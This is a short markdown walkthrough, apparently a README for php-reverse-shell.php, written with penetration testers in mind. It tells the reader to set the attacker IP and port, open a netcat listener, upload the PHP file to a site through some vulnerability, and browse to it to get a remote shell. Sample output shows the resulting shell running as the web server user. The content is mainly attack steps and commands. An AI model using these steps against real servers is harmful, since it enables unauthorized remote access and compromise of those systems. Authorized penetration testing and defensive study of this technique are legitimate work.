# Walk Through
- [x] **Modify the source**
- To prevent someone else from abusing your backdoor – a nightmare scenario while pentesting – you need to modify the source code to indicate where you want the reverse shell thrown back to.  Edit the following lines of php-reverse-shell.php:
______________
| Variable      | Default                | Personal?                       |
| ------------- |:----------------------:| -------------------------------:|
| $ip           | __127.0.0.1__          | Edit __line 7__                 |
| $port         | __1234__               | Edit __line 8__                 |
______________

- [x] **Get Ready to catch the reverse shell**
- Start a TCP listener on a host and port that will be accessible by the web server.  Use the same port here as you specified in the script (1234 in this example):
```
$ nc -v -n -l -p 1234
```
- [x] **Upload and Run the script**
- Using whatever vulnerability you’ve discovered in the website, upload php-reverse-shell.php.  Run the script simply by browsing to the newly uploaded file in your web browser (NB: You won’t see any output on the web page, it’ll just hang if successful):
```
http://somesite/php-reverse-shell.php
```
- [x] **Enjoy your new shell**
- If all went well, the web server should have thrown back a shell to your netcat listener.  Some useful commans such as w, uname -a, id and pwd are run automatically for you:
```
$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58012
Linux somehost 2.6.19-gentoo-r5 #1 SMP PREEMPT Sun Apr 1 16:49:38 BST 2007 x86_64 AMD Athlon(tm) 64 X2 Dual Core Processor 4200+ AuthenticAMD GNU/Linux
 16:59:28 up 39 days, 19:54,  2 users,  load average: 0.18, 0.13, 0.10
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
root   :0        19May07 ?xdm?   5:10m  0.01s /bin/sh
uid=81(apache) gid=81(apache) groups=81(apache)
sh: no job control in this shell
sh-3.2$
```
